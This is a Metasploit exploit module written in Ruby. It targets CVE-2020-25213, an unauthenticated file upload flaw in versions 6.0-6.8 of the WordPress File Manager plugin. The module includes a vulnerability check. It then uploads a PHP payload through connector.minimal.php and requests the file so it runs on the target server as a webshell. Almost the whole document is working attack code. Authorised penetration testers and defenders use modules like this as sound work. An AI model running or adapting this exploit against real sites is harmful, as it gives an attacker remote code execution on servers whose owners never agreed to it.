##
# This module requires Metasploit Framework
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Util::File

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress File Manager Plugin Unauthenticated File Upload',
        'Description' => %q{
          This module exploits an unauthenticated arbitrary file upload vulnerability
          in the WordPress File Manager plugin, versions 6.0-6.8. By sending a
          malicious request to the connector.minimal.php file, an attacker can
          upload arbitrary PHP code to the server, leading to remote code execution.
        },
        'Author' => [
          'w4fz5uck5', # Original discovery
          'Ville Korhonen', # Submitter
          'Your Name Here'  # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2020-25213'],
          ['URL', 'https://wpscan.com/vulnerability/e528ae38-72f0-49ff-9878-922eff59ace9'],
          ['URL', 'https://blog.nintechnet.com/critical-zero-day-vulnerability-fixed-in-wordpress-file-manager-700000-installations/'],
          ['URL', 'https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/'],
          ['URL', 'https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/'],
          ['URL', 'https://blog.sucuri.net/2020/09/critical-vulnerability-file-manager-affecting-700k-wordpress-websites.html'],
          ['URL', 'https://twitter.com/w4fz5uck5/status/1298402173554958338'],
          ['URL', 'https://ypcs.fi/misc/code/pocs/2020-wp-file-manager-v67.py']
        ],
        'DisclosureDate' => '2020-09-01',
        'Platform' => ['php'],
        'Arch' => ARCH_PHP,
        'Targets' => [
          [
            'Automatic',
            {
              'Platform' => ['php'],
              'Arch' => ARCH_PHP
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'RPORT' => 80,
          'TARGETURI' => '/'
        },
        'Notes' => {
          'Stability' => CORE_STABLE,
          'Reliability' => EXCELLENT,
          'SideEffects' => ARTIFACT_DISCOVER
        }
      )
    )

    register_options(
      [
        OptString.new('TARGETURI', [ true, 'The base path to the wordpress application', '/']),
        OptString.new('PLUGIN_PATH', [true, 'Path to wp-file-manager plugin', 'wp-content/plugins/wp-file-manager/'])
      ]
    )
  end

  def check
    vuln_path = normalize_uri(target_uri.path, datastore['PLUGIN_PATH'], 'lib/php/connector.minimal.php')
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => vuln_path
    })

    unless res
      return CheckCode::Unknown("Target did not respond to check request.")
    end

    if res.code == 200 && res.body.include?('elFinderConnector.class.php')
      return CheckCode::Vulnerable
    end

    CheckCode::Safe
  end

  def exploit
    # Generate a random filename
    filename = "#{rand_text_alpha(8..12)}.php"
    php_payload = "<?php #{payload.encoded} ?>"
    print_status("Generated payload: #{php_payload}")

    # Craft the upload request
    upload_path = normalize_uri(target_uri.path, datastore['PLUGIN_PATH'], 'lib/php/connector.minimal.php')
    print_status("Using upload path: #{upload_path}")

    post_data = Rex::Mime::Message.new
    post_data.add_part('upload', nil, 'name="cmd"')
    post_data.add_part('l1_Lw', nil, 'name="target"') # This is the root directory
    post_data.add_part(php_payload, "application/x-php", 'name="upload[]"; filename="' + filename + '"')
    post_data.bound = Rex::Text.rand_text_alpha(8)

    print_status("Sending upload request...")
    res = send_request_cgi(
      {
        'method' => 'POST',
        'uri' => upload_path,
        'ctype' => "multipart/form-data; boundary=" + post_data.bound,
        'data' => post_data.to_s
      }, 5
    )

    unless res
      fail_with(Failure::Unreachable, 'Target did not respond to upload request')
    end

    if res.code != 200
      print_error("Upload failed: #{res.code} - #{res.body}")
      fail_with(Failure::UnexpectedReply, "File upload failed.")
    end

    # Execute the uploaded file
    print_status("Executing the uploaded file...")
    webshell_path = normalize_uri(target_uri.path, datastore['PLUGIN_PATH'], "lib/files/#{filename}")
    print_status("Webshell path: #{webshell_path}")
    res = send_request_cgi(
      {
        'method' => 'GET',
        'uri' => webshell_path
      }, 5
    )

    unless res
      fail_with(Failure::Unreachable, 'Target did not respond to webshell request')
    end

    if res.code != 200
      print_error("Webshell execution failed: #{res.code} - #{res.body}")
      fail_with(Failure::UnexpectedReply, "Webshell execution failed.")
    end
  end
end